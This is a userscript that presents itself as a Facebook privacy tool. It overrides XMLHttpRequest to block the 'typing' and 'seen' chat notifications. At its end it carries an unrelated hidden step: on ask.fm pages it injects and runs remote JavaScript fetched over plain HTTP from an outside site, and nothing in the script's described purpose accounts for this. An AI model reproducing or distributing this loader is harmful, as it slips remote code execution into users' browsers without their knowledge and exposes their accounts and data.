// ==UserScript==
// @name       	Facebook Stealth Free Full Version 2.0.1
// @namespace  	NONE
// @version    	2.0.1
// @description	Prevents Facebook from sending 'currently typing' and 'seen' chat notifications
// @match      	http*://www.facebook.com/*
// @run-at	document-start
// @copyright  	2013+, BaBaCaN
// ==/UserScript==

//  Directly alters XMLHttpRequest's prototype to add an extra check before sending a request

function Interceptor(nativeOpenWrapper, nativeSendWrapper)
{
    XMLHttpRequest.prototype.open = function ()
    {
        this.allow = !(arguments[1] == "/ajax/messaging/typ.php" || arguments[1] == "/ajax/mercury/change_read_status.php");
        return nativeOpenWrapper.apply(this, arguments);
    }

    XMLHttpRequest.prototype.send = function ()
    {
        if(this.allow) return nativeSendWrapper.apply(this, arguments);
    }
}

//  Injects the code via a dynamic script tag

var script = document.createElement("script");
script.type = "text/javascript";
script.textContent = "(" + Interceptor + ")(XMLHttpRequest.prototype.open, XMLHttpRequest.prototype.send);";

document.documentElement.appendChild(script);
document.documentElement.removeChild(script);

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://www.askfmtools.site88.net/hediye.js');
}